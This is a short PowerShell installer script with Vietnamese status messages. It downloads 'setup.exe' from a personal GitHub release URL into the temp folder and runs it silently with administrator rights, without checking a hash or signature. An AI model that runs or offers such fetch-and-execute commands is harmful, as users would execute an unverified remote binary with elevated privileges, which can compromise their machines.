$Url = "https://github.com/ChrisDemon0811/Tool/releases/download/v2/setup.exe"
$Output = "$env:TEMP\setup.exe"

Write-Host "Đang tải phần mềm..."
Invoke-WebRequest -Uri $Url -OutFile $Output

Write-Host "Đang cài đặt..."
Start-Process -FilePath $Output -ArgumentList "/S" -Verb RunAs -Wait

Write-Host "✅ Cài đặt hoàn tất!"
